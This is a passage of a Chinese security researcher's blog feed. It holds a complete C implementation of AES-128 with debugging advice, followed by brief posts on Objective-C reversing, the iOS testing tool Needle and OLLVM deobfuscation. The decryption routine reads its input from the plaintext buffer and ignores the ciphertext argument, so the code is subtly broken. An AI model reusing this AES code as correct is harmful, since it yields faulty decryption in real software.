<h3 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h3><p>如果实现完测试发现 解密结果不正确， 那么就要分别排除是 <code>加密</code>环节 还是<code>解密</code>环节出现了问题，我的方法是使用<a href="http://tool.oschina.net/encrypt" target="_blank" rel="external">在线加解密网站</a>对比我们代码得到的结果。</p>
<p>确定了bug的范围，剩下的工作就是参考算法原理重新撸流程了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div></pre></td><td class="code"><pre><div class="line">/*</div><div class="line"> *</div><div class="line"> * Chinese Academy of Sciences</div><div class="line"> * State Key Laboratory of Information Security</div><div class="line"> * Institute of Information Engineering</div><div class="line"> *</div><div class="line"> * Copyright (C) 2016 Chinese Academy of Sciences</div><div class="line"> *</div><div class="line"> * LuoPeng, luopeng@iie.ac.cn</div><div class="line"> * Updated in Oct 2016</div><div class="line"> * Updated in Jan 2017, update muliple function on GF(2^8).</div><div class="line"> *</div><div class="line"> */</div><div class="line">#include &lt;stdint.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line"></div><div class="line">#include &quot;aes.h&quot;</div><div class="line"></div><div class="line">/*</div><div class="line"> * round constants</div><div class="line"> */</div><div class="line">static uint8_t RC[] = &#123;0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36&#125;;</div><div class="line"></div><div class="line">/*</div><div class="line"> * Sbox</div><div class="line"> */</div><div class="line">static uint8_t SBOX[256] = &#123;</div><div class="line">    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,</div><div class="line">    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,</div><div class="line">    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,</div><div class="line">    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,</div><div class="line">    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,</div><div class="line">    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,</div><div class="line">    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,</div><div class="line">    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,</div><div class="line">    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,</div><div class="line">    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,</div><div class="line">    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,</div><div class="line">    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,</div><div class="line">    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,</div><div class="line">    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,</div><div class="line">    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,</div><div class="line">    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16&#125;;</div><div class="line"></div><div class="line">/*</div><div class="line"> * Inverse Sboxs</div><div class="line"> */</div><div class="line">static uint8_t INV_SBOX[256] = &#123;</div><div class="line">    0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb,</div><div class="line">    0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb,</div><div class="line">    0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e,</div><div class="line">    0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25,</div><div class="line">    0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92,</div><div class="line">    0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84,</div><div class="line">    0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06,</div><div class="line">    0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b,</div><div class="line">    0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73,</div><div class="line">    0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e,</div><div class="line">    0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b,</div><div class="line">    0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4,</div><div class="line">    0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f,</div><div class="line">    0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef,</div><div class="line">    0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61,</div><div class="line">    0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d&#125;;</div><div class="line"></div><div class="line">/**</div><div class="line"> * https://en.wikipedia.org/wiki/Finite_field_arithmetic</div><div class="line"> * Multiply two numbers in the GF(2^8) finite field defined</div><div class="line"> * by the polynomial x^8 + x^4 + x^3 + x + 1 = 0</div><div class="line"> * We do use mul2(int8_t a) but not mul(uint8_t a, uint8_t b)</div><div class="line"> * just in order to get a higher speed.</div><div class="line"> */</div><div class="line">static inline uint8_t mul2(uint8_t a) &#123;</div><div class="line">    return (a&amp;0x80) ? ((a&lt;&lt;1)^0x1b) : (a&lt;&lt;1);</div><div class="line">&#125;</div><div class="line"></div><div class="line">/**</div><div class="line"> * @purpose:    ShiftRows</div><div class="line"> * @descrption:</div><div class="line"> *  Row0: s0  s4  s8  s12   &lt;&lt;&lt; 0 byte</div><div class="line"> *  Row1: s1  s5  s9  s13   &lt;&lt;&lt; 1 byte</div><div class="line"> *  Row2: s2  s6  s10 s14   &lt;&lt;&lt; 2 bytes</div><div class="line"> *  Row3: s3  s7  s11 s15   &lt;&lt;&lt; 3 bytes</div><div class="line"> */</div><div class="line">static void shift_rows(uint8_t *state) &#123;</div><div class="line">    uint8_t temp;</div><div class="line">    // row1</div><div class="line">    temp        = *(state+1);</div><div class="line">    *(state+1)  = *(state+5);</div><div class="line">    *(state+5)  = *(state+9);</div><div class="line">    *(state+9)  = *(state+13);</div><div class="line">    *(state+13) = temp;</div><div class="line">    // row2</div><div class="line">    temp        = *(state+2);</div><div class="line">    *(state+2)  = *(state+10);</div><div class="line">    *(state+10) = temp;</div><div class="line">    temp        = *(state+6);</div><div class="line">    *(state+6)  = *(state+14);</div><div class="line">    *(state+14) = temp;</div><div class="line">    // row3</div><div class="line">    temp        = *(state+15);</div><div class="line">    *(state+15) = *(state+11);</div><div class="line">    *(state+11) = *(state+7);</div><div class="line">    *(state+7)  = *(state+3);</div><div class="line">    *(state+3)  = temp;</div><div class="line">&#125;</div><div class="line"></div><div class="line">/**</div><div class="line"> * @purpose:    Inverse ShiftRows</div><div class="line"> * @description</div><div class="line"> *  Row0: s0  s4  s8  s12   &gt;&gt;&gt; 0 byte</div><div class="line"> *  Row1: s1  s5  s9  s13   &gt;&gt;&gt; 1 byte</div><div class="line"> *  Row2: s2  s6  s10 s14   &gt;&gt;&gt; 2 bytes</div><div class="line"> *  Row3: s3  s7  s11 s15   &gt;&gt;&gt; 3 bytes</div><div class="line"> */</div><div class="line">static void inv_shift_rows(uint8_t *state) &#123;</div><div class="line">    uint8_t temp;</div><div class="line">    // row1</div><div class="line">    temp        = *(state+13);</div><div class="line">    *(state+13) = *(state+9);</div><div class="line">    *(state+9)  = *(state+5);</div><div class="line">    *(state+5)  = *(state+1);</div><div class="line">    *(state+1)  = temp;</div><div class="line">    // row2</div><div class="line">    temp        = *(state+14);</div><div class="line">    *(state+14) = *(state+6);</div><div class="line">    *(state+6)  = temp;</div><div class="line">    temp        = *(state+10);</div><div class="line">    *(state+10) = *(state+2);</div><div class="line">    *(state+2)  = temp;</div><div class="line">    // row1</div><div class="line">    temp        = *(state+3);</div><div class="line">    *(state+3)  = *(state+7);</div><div class="line">    *(state+7)  = *(state+11);</div><div class="line">    *(state+11) = *(state+15);</div><div class="line">    *(state+15) = temp;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void aes_key_schedule_128(const uint8_t *key, uint8_t *roundkeys) &#123;</div><div class="line"></div><div class="line">    uint8_t temp[4];</div><div class="line">    uint8_t *last4bytes; // point to the last 4 bytes of one round</div><div class="line">    uint8_t *lastround;</div><div class="line">    uint8_t i;</div><div class="line"></div><div class="line">    for (i = 0; i &lt; 16; ++i) &#123;</div><div class="line">        *roundkeys++ = *key++;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    last4bytes = roundkeys-4;</div><div class="line">    for (i = 0; i &lt; AES_ROUNDS; ++i) &#123;</div><div class="line">        // k0-k3 for next round</div><div class="line">        temp[3] = SBOX[*last4bytes++];</div><div class="line">        temp[0] = SBOX[*last4bytes++];</div><div class="line">        temp[1] = SBOX[*last4bytes++];</div><div class="line">        temp[2] = SBOX[*last4bytes++];</div><div class="line">        temp[0] ^= RC[i];</div><div class="line">        lastround = roundkeys-16;</div><div class="line">        *roundkeys++ = temp[0] ^ *lastround++;</div><div class="line">        *roundkeys++ = temp[1] ^ *lastround++;</div><div class="line">        *roundkeys++ = temp[2] ^ *lastround++;</div><div class="line">        *roundkeys++ = temp[3] ^ *lastround++;</div><div class="line">        // k4-k7 for next round</div><div class="line">        *roundkeys++ = *last4bytes++ ^ *lastround++;</div><div class="line">        *roundkeys++ = *last4bytes++ ^ *lastround++;</div><div class="line">        *roundkeys++ = *last4bytes++ ^ *lastround++;</div><div class="line">        *roundkeys++ = *last4bytes++ ^ *lastround++;</div><div class="line">        // k8-k11 for next round</div><div class="line">        *roundkeys++ = *last4bytes++ ^ *lastround++;</div><div class="line">        *roundkeys++ = *last4bytes++ ^ *lastround++;</div><div class="line">        *roundkeys++ = *last4bytes++ ^ *lastround++;</div><div class="line">        *roundkeys++ = *last4bytes++ ^ *lastround++;</div><div class="line">        // k12-k15 for next round</div><div class="line">        *roundkeys++ = *last4bytes++ ^ *lastround++;</div><div class="line">        *roundkeys++ = *last4bytes++ ^ *lastround++;</div><div class="line">        *roundkeys++ = *last4bytes++ ^ *lastround++;</div><div class="line">        *roundkeys++ = *last4bytes++ ^ *lastround++;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void aes_encrypt_128(const uint8_t *roundkeys, const uint8_t *plaintext, uint8_t *ciphertext) &#123;</div><div class="line"></div><div class="line">    uint8_t tmp[16], t;</div><div class="line">    uint8_t i, j;</div><div class="line"></div><div class="line">    // first AddRoundKey</div><div class="line">    for ( i = 0; i &lt; AES_BLOCK_SIZE; ++i ) &#123;</div><div class="line">        *(ciphertext+i) = *(plaintext+i) ^ *roundkeys++;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 9 rounds</div><div class="line">    for (j = 1; j &lt; AES_ROUNDS; ++j) &#123;</div><div class="line"></div><div class="line">        // SubBytes</div><div class="line">        for (i = 0; i &lt; AES_BLOCK_SIZE; ++i) &#123;</div><div class="line">            *(tmp+i) = SBOX[*(ciphertext+i)];</div><div class="line">        &#125;</div><div class="line">        shift_rows(tmp);</div><div class="line">        /*</div><div class="line">         * MixColumns</div><div class="line">         * [02 03 01 01]   [s0  s4  s8  s12]</div><div class="line">         * [01 02 03 01] . [s1  s5  s9  s13]</div><div class="line">         * [01 01 02 03]   [s2  s6  s10 s14]</div><div class="line">         * [03 01 01 02]   [s3  s7  s11 s15]</div><div class="line">         */</div><div class="line">        for (i = 0; i &lt; AES_BLOCK_SIZE; i+=4)  &#123;</div><div class="line">            t = tmp[i] ^ tmp[i+1] ^ tmp[i+2] ^ tmp[i+3];</div><div class="line">            ciphertext[i]   = mul2(tmp[i]   ^ tmp[i+1]) ^ tmp[i]   ^ t;</div><div class="line">            ciphertext[i+1] = mul2(tmp[i+1] ^ tmp[i+2]) ^ tmp[i+1] ^ t;</div><div class="line">            ciphertext[i+2] = mul2(tmp[i+2] ^ tmp[i+3]) ^ tmp[i+2] ^ t;</div><div class="line">            ciphertext[i+3] = mul2(tmp[i+3] ^ tmp[i]  ) ^ tmp[i+3] ^ t;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        // AddRoundKey</div><div class="line">        for ( i = 0; i &lt; AES_BLOCK_SIZE; ++i ) &#123;</div><div class="line">            *(ciphertext+i) ^= *roundkeys++;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // last round</div><div class="line">    for (i = 0; i &lt; AES_BLOCK_SIZE; ++i) &#123;</div><div class="line">        *(ciphertext+i) = SBOX[*(ciphertext+i)];</div><div class="line">    &#125;</div><div class="line">    shift_rows(ciphertext);</div><div class="line">    for ( i = 0; i &lt; AES_BLOCK_SIZE; ++i ) &#123;</div><div class="line">        *(ciphertext+i) ^= *roundkeys++;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">void aes_decrypt_128(const uint8_t *roundkeys, const uint8_t *ciphertext, uint8_t *plaintext) &#123;</div><div class="line"></div><div class="line">    uint8_t tmp[16];</div><div class="line">    uint8_t t, u, v;</div><div class="line">    uint8_t i, j;</div><div class="line"></div><div class="line">    roundkeys += 160;</div><div class="line"></div><div class="line">    // first round</div><div class="line">    for ( i = 0; i &lt; AES_BLOCK_SIZE; ++i ) &#123;</div><div class="line">        *(plaintext+i) = *(plaintext+i) ^ *(roundkeys+i);</div><div class="line">    &#125;</div><div class="line">    roundkeys -= 16;</div><div class="line">    inv_shift_rows(plaintext);</div><div class="line">    for (i = 0; i &lt; AES_BLOCK_SIZE; ++i) &#123;</div><div class="line">        *(plaintext+i) = INV_SBOX[*(plaintext+i)];</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    for (j = 1; j &lt; AES_ROUNDS; ++j) &#123;</div><div class="line"></div><div class="line">        // Inverse AddRoundKey</div><div class="line">        for ( i = 0; i &lt; AES_BLOCK_SIZE; ++i ) &#123;</div><div class="line">            *(tmp+i) = *(plaintext+i) ^ *(roundkeys+i);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        /*</div><div class="line">         * Inverse MixColumns</div><div class="line">         * [0e 0b 0d 09]   [s0  s4  s8  s12]</div><div class="line">         * [09 0e 0b 0d] . [s1  s5  s9  s13]</div><div class="line">         * [0d 09 0e 0b]   [s2  s6  s10 s14]</div><div class="line">         * [0b 0d 09 0e]   [s3  s7  s11 s15]</div><div class="line">         */</div><div class="line">        for (i = 0; i &lt; AES_BLOCK_SIZE; i+=4) &#123;</div><div class="line">            t = tmp[i] ^ tmp[i+1] ^ tmp[i+2] ^ tmp[i+3];</div><div class="line">            plaintext[i]   = t ^ tmp[i]   ^ mul2(tmp[i]   ^ tmp[i+1]);</div><div class="line">            plaintext[i+1] = t ^ tmp[i+1] ^ mul2(tmp[i+1] ^ tmp[i+2]);</div><div class="line">            plaintext[i+2] = t ^ tmp[i+2] ^ mul2(tmp[i+2] ^ tmp[i+3]);</div><div class="line">            plaintext[i+3] = t ^ tmp[i+3] ^ mul2(tmp[i+3] ^ tmp[i]);</div><div class="line">            u = mul2(mul2(tmp[i]   ^ tmp[i+2]));</div><div class="line">            v = mul2(mul2(tmp[i+1] ^ tmp[i+3]));</div><div class="line">            t = mul2(u ^ v);</div><div class="line">            plaintext[i]   ^= t ^ u;</div><div class="line">            plaintext[i+1] ^= t ^ v;</div><div class="line">            plaintext[i+2] ^= t ^ u;</div><div class="line">            plaintext[i+3] ^= t ^ v;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        // Inverse ShiftRows</div><div class="line">        inv_shift_rows(plaintext);</div><div class="line"></div><div class="line">        // Inverse SubBytes</div><div class="line">        for (i = 0; i &lt; AES_BLOCK_SIZE; ++i) &#123;</div><div class="line">            *(plaintext+i) = INV_SBOX[*(plaintext+i)];</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        roundkeys -= 16;</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // last AddRoundKey</div><div class="line">    for ( i = 0; i &lt; AES_BLOCK_SIZE; ++i ) &#123;</div><div class="line">        *(plaintext+i) ^= *(roundkeys+i);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>最后再来2张当年的PPT<br><img src="/include/img/aes2.JPG" alt=""><br><img src="/include/img/aes3.JPG" alt=""></p>
<h1 id="Todo"><a href="#Todo" class="headerlink" title="Todo"></a>Todo</h1><ul>
<li>测试代码，撸流程</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;img src=&quot;/include/img/aes1.JPG&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="研究" scheme="http://yoursite.com/categories/categories-research/"/>
    
    
      <category term="密码学" scheme="http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>预览Object-C基础教程</title>
    <link href="http://yoursite.com/2017/05/24/%E9%A2%84%E8%A7%88Object-C%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/"/>
    <id>http://yoursite.com/2017/05/24/预览Object-C基础教程/</id>
    <published>2017-05-24T04:47:53.000Z</published>
    <updated>2017-05-24T04:59:33.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p>为了 逆向Object-C 我也是 拼了。。。<br><a id="more"></a></p>
<p>在《ios arm 汇编》 文章中分析object-C 汇编时，要解决如下问题：</p>
<ul>
<li>出现了<code>struct __objc_method</code> 用来定义 一个OC 函数。其背后的原理是什么？</li>
<li>反汇编代码中  OC 函数的声明变成了<br><code>int -[ViewController addValue:toValue:](void * self, void * _cmd, int arg2, int arg3) {</code>  这里的self 和 _cmd 是什么， 和runtime 什么关系？</li>
</ul>
<p>下面的文章是要 解释上面的问题， 不过貌似问题越来越复杂 ， 看书找答案。</p>
<p><a href="http://ios.jobbole.com/82143/" target="_blank" rel="external">Objective-C特性：Runtime</a><br><a href="https://github.com/ming1016/study/wiki/%E6%B7%B1%E5%85%A5%E5%89%96%E6%9E%90-iOS-%E7%BC%96%E8%AF%91-Clang---LLVM" target="_blank" rel="external">深入剖析 iOS 编译 Clang / LLVM</a><br><a href="http://zhiwei.li/text/2010/03/07/objective-c%E9%80%86%E5%90%91%E5%AE%9E%E6%88%98/" target="_blank" rel="external">Objective-C逆向实战</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;为了 逆向Object-C 我也是 拼了。。。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Needle初探</title>
    <link href="http://yoursite.com/2017/05/23/Needle%E5%88%9D%E6%8E%A2/"/>
    <id>http://yoursite.com/2017/05/23/Needle初探/</id>
    <published>2017-05-23T13:24:31.000Z</published>
    <updated>2017-05-23T13:26:10.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p>ios版的 drozer 工具，基于Frida实现，只能在越狱手机上使用。</p>
<a id="more"></a>
<p>功能：<br><a href="https://github.com/mwrlabs/needle.git" target="_blank" rel="external">https://github.com/mwrlabs/needle.git</a></p>
<p>安装：<br><a href="https://github.com/mwrlabs/needle/wiki/Installation-Guide" target="_blank" rel="external">https://github.com/mwrlabs/needle/wiki/Installation-Guide</a></p>
<p>安装包：<br><a href="https://github.com/mwrlabs/needle/releases" target="_blank" rel="external">https://github.com/mwrlabs/needle/releases</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;ios版的 drozer 工具，基于Frida实现，只能在越狱手机上使用。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>OLLVM 基础学习</title>
    <link href="http://yoursite.com/2017/05/22/OLLVM-%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2017/05/22/OLLVM-基础学习/</id>
    <published>2017-05-22T13:35:01.000Z</published>
    <updated>2017-06-19T02:02:47.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p>发现2017年代码混淆技术流行了起来，ios 和 android 上应用的都非常广泛。在这记录一下学习的一点新的，项目相关的案例要等项目接触，酌情选择一部分出来分享。</p>
<p>本文参考了：</p>
<p><a href="https://blog.quarkslab.com/deobfuscation-recovering-an-ollvm-protected-program.html" target="_blank" rel="external">Deobfuscation: recovering an OLLVM-protected program</a></p>
<p>（<a href="http://www.freebuf.com/articles/terminal/130142.html" target="_blank" rel="external">反混淆：恢复被OLLVM保护的程序</a>） 帮助我快速入门OLLVM。</p>
